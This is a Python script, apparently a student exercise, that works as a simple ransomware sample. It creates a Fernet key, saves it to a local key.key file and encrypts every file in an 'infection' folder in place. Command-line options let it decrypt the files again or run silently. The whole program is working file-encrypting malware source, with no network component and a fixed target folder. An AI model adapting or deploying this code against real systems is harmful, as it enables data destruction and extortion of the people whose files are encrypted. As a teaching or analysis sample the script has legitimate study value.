import cryptography
import argparse
import os
from cryptography.fernet import Fernet


target = 'infection'


# Check if key file exists and if not create it
if os.path.isfile('key.key') == True:
	with open('key.key', 'rb') as fkey:
		key = fkey.read()
		print(key)
elif os.path.isfile('key.key') == False:
	key = Fernet.generate_key()
	# Save encription key to a file
	with open('key.key', 'wb') as key_file:
	    key_file.write(key)


# Decript a file
def yz_decript_file(fl):
	file = target + '/' + fl
	# with open('.key', 'rb') as filekey:
	#     key = filekey.read()
	fernet = Fernet(key)
	with open(file, 'rb') as enc_file:
	    encrypted = enc_file.read()
	# # decrypting the file
	decrypted = fernet.decrypt(encrypted)
	# # opening the file in write mode and writing the decrypted data
	with open(file, 'wb') as dec_file:
		dec_file.write(decrypted)
		print(f"Decripted File: {file}")


# Cure the files in target directory
def yz_cure_target():
	# Get list of files
	get_files = os.listdir(target)
	# print(get_files)
	for f in get_files:
		yz_decript_file(f)


# Encript a file
def yz_enrcipt_file(fl, slt):
	file = target + '/' + fl
	# Use Key
	fernet = Fernet(key)
	with open(file, 'rb') as f:
		original = f.read()

	# Encript the file
	encrypted = fernet.encrypt(original)

	# Open file and write encripted data
	with open(file, 'wb') as encrypted_file:
		encrypted_file.write(encrypted)
		if slt == False:
			print(f"Encripted File: {file}")


# Infect the files in target folder
def yz_infect_target(target, slt):
	# Get list of files
	get_files = os.listdir(target)
	# print(get_files)
	for f in get_files:
		yz_enrcipt_file(f, slt)


# Handle Arguments
def yz_handle_args(args):
	if args.h or args.help:
		print(f"Help is: on your way")
		exit()
	if args.v or args.version:
		print("The Version of the program is: 1.0b")
		exit()
	if args.r or args.reverse:
		print(f"R is: {args.r}")
		yz_cure_target()
	if args.s or args.silent:
		print(f'Silent is: {args.silent}')


# Parse CLI arguments
def cli_scan():
	scan = argparse.ArgumentParser(add_help=False)

	# The program will have the option "–help" or "-h" to display help. To do this we have to overwrite the build-in
	scan.add_argument('-h', action='store_true')
	scan.add_argument('-help', action='store_true')

    # The program will have the option "–version" or "-v" to show the version of the program.
	scan.add_argument("-v", help="", type=bool, nargs='?', const=True)
	scan.add_argument("-version", help="", type=bool, nargs='?', const=True)

	# # The program will have the option "–reverse" or "-r" followed by the key entered as
	# # an argument to reverse the infection.    
	scan.add_argument("-r", help="", type=bool, nargs='?', const=True)
	scan.add_argument("-reverse", help="", type=bool, nargs='?', const=True)

    # # The program will show each encrypted file during the process unless the option is
	# # indicated "–silent" or "-s", in which case the program will not produce any output.
	scan.add_argument("-s", help="", type=bool, nargs='?', const=True)
	scan.add_argument("-silent", help="", type=bool, nargs='?', const=True)    

	return scan.parse_args()


# Main Function
if __name__ == '__main__':
	args = cli_scan()
	yz_handle_args(args)
	slt = False
	if args.s or args.silent:
		slt = True
	# print(slt)
	if not args.r:
		yz_infect_target(target, slt)

